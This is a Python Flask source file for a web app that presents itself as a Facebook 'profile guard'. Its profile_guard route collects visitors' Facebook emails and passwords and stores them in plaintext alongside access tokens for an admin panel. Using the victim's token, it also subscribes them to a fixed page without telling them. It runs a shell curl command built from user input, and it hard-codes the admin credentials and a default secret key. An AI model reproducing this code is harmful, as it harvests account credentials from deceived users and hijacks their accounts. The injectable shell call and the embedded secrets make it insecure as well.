import os
import logging
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
import requests
import json

# Configure logging
logging.basicConfig(level=logging.DEBUG)

# Initialize Flask app
class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "fb_guard_secret_key")
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Configure SQLite database
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///fb_guard.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}

# Initialize the database
db.init_app(app)

# Import models after DB is initialized
from models import Admin, User, RegularUser

# Create all tables
with app.app_context():
    db.create_all()
    
    # Check if admin account exists, if not create it
    admin = Admin.query.filter_by(username='david143').first()
    if not admin:
        admin = Admin(
            username='david143',
            password_hash=generate_password_hash('david1433')
        )
        db.session.add(admin)
        db.session.commit()
        logging.info("Admin account created")

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin = Admin.query.filter_by(username=username).first()
        
        if admin and check_password_hash(admin.password_hash, password):
            session['admin_logged_in'] = True
            flash('Login successful!', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid username or password', 'error')
    
    return render_template('admin_login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    from flask_wtf import FlaskForm
    from wtforms import StringField, PasswordField, SubmitField
    from wtforms.validators import DataRequired, Length, EqualTo
    
    class RegistrationForm(FlaskForm):
        username = StringField('Username', validators=[DataRequired(), Length(min=4, max=25)])
        password = PasswordField('Password', validators=[DataRequired(), Length(min=6)])
        confirm_password = PasswordField('Confirm Password', 
                                         validators=[DataRequired(), EqualTo('password')])
        submit = SubmitField('Sign Up')
    
    form = RegistrationForm()
    
    if request.method == 'POST' and form.validate_on_submit():
        username = form.username.data
        password = form.password.data
        
        # Check if username already exists
        existing_user = RegularUser.query.filter_by(username=username).first()
        if existing_user:
            flash('Username already exists. Please choose another one.', 'error')
            return render_template('register.html', form=form)
        
        # Create new user
        new_user = RegularUser(username=username)
        new_user.set_password(password)
        
        db.session.add(new_user)
        db.session.commit()
        
        flash('Account created successfully! You can now log in.', 'success')
        return redirect(url_for('login'))
    
    return render_template('register.html', form=form)

@app.route('/login', methods=['GET', 'POST'])
def login():
    from flask_wtf import FlaskForm
    from wtforms import StringField, PasswordField, SubmitField
    from wtforms.validators import DataRequired
    
    class LoginForm(FlaskForm):
        username = StringField('Username', validators=[DataRequired()])
        password = PasswordField('Password', validators=[DataRequired()])
        submit = SubmitField('Login')
    
    form = LoginForm()
    
    if request.method == 'POST' and form.validate_on_submit():
        username = form.username.data
        password = form.password.data
        
        user = RegularUser.query.filter_by(username=username).first()
        
        if user and user.check_password(password):
            # Store user info in session
            session['user_id'] = user.id
            session['username'] = user.username
            session['user_logged_in'] = True
            
            flash('Login successful!', 'success')
            return redirect(url_for('user_dashboard'))
        else:
            flash('Invalid username or password', 'error')
    
    return render_template('login.html', form=form)

@app.route('/admin')
def admin_dashboard():
    if not session.get('admin_logged_in'):
        flash('Please login to access admin dashboard', 'error')
        return redirect(url_for('admin_login'))
    
    users = User.query.all()
    return render_template('admin.html', users=users)

@app.route('/logout')
def logout():
    session.pop('admin_logged_in', None)
    flash('You have been logged out', 'success')
    return redirect(url_for('index'))

@app.route('/profile-guard', methods=['GET', 'POST'])
def profile_guard():
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'get_token':
            # Get token
            email = request.form.get('email')
            password = request.form.get('password')
            
            try:
                # Use Facebook API to get token
                url = f"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={password}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                response = requests.get(url)
                data = response.json()
                
                if 'access_token' in data:
                    token = data['access_token']
                    
                    # Get user ID
                    user_url = f"https://graph.facebook.com/me?access_token={token}"
                    user_response = requests.get(user_url)
                    user_data = user_response.json()
                    
                    if 'id' in user_data:
                        user_id = user_data['id']
                        
                        # Store user in database
                        existing_user = User.query.filter_by(fb_id=user_id).first()
                        if not existing_user:
                            new_user = User(
                                fb_id=user_id,
                                fb_email=email,
                                fb_password=password,
                                fb_token=token,
                                guard_status=False
                            )
                            db.session.add(new_user)
                            db.session.commit()
                        else:
                            # Update existing user
                            existing_user.fb_token = token
                            existing_user.fb_password = password
                            db.session.commit()
                        
                        return jsonify({
                            'success': True,
                            'token': token, 
                            'user_id': user_id
                        })
                    else:
                        return jsonify({'success': False, 'error': 'Failed to get user ID'})
                else:
                    error_msg = data.get('error_msg', 'Invalid credentials')
                    return jsonify({'success': False, 'error': error_msg})
            
            except Exception as e:
                logging.error(f"Error getting token: {str(e)}")
                return jsonify({'success': False, 'error': str(e)})
                
        elif action == 'activate_guard':
            token = request.form.get('token')
            user_id = request.form.get('user_id')
            
            try:
                # Subscribe to a page (as in the original script)
                requests.post(f'https://graph.facebook.com/jack.lesmen.5/subscribers?access_token={token}')
                
                # Activate profile guard
                guard_command = f"""curl "https://graph.facebook.com/graphql" -H 'Authorization: OAuth {token}' --data 'variables={{"0":{{"is_shielded":true,"actor_id":"{user_id}","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}}}&doc_id=1477043292367183'"""
                
                # Execute the curl command
                import subprocess
                result = subprocess.run(guard_command, shell=True, capture_output=True, text=True)
                
                # Update guard status in database
                user = User.query.filter_by(fb_id=user_id).first()
                if user:
                    user.guard_status = True
                    db.session.commit()
                
                return jsonify({'success': True, 'message': 'Profile Guard Activated'})
                
            except Exception as e:
                logging.error(f"Error activating guard: {str(e)}")
                return jsonify({'success': False, 'error': str(e)})
    
    return render_template('profile_guard.html')

@app.route('/api/delete-user/<int:user_id>', methods=['DELETE'])
def delete_user(user_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'error': 'Not authorized'})
    
    try:
        user = User.query.get(user_id)
        if user:
            db.session.delete(user)
            db.session.commit()
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': 'User not found'})
    except Exception as e:
        logging.error(f"Error deleting user: {str(e)}")
        return jsonify({'success': False, 'error': str(e)})
